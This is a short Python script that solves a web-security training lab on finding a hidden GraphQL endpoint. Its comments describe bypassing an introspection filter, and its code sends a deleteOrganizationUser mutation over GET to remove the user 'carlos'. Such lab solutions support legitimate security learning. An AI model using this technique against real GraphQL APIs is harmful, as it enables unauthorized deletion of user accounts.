##############################################################
#
# Lab: Finding a hidden GraphQL endpoint
#
# Hack Steps:
#      1. Find the hidden endpoint by trying multiple paths
#      2. Bypassing the introspection defenses by appending 
#         `__schema` with a new line before `{`
#      3. Analyze the introspection result
#      4. Delete carlos using the appropriate mutation
#
##############################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ada0015047619fc814211e5008600a4.web-security-academy.net"

def main():
    print("❯❯ Deleting carlos.. ", end="", flush=True)

    mutation = """mutation deleteOrganizationUser {
                    deleteOrganizationUser(input: { id: 3 }) {
                        user { 
                            id
                            username
                        }
                    }
                }"""
    fetch(f"/api?query={mutation}")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:    
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

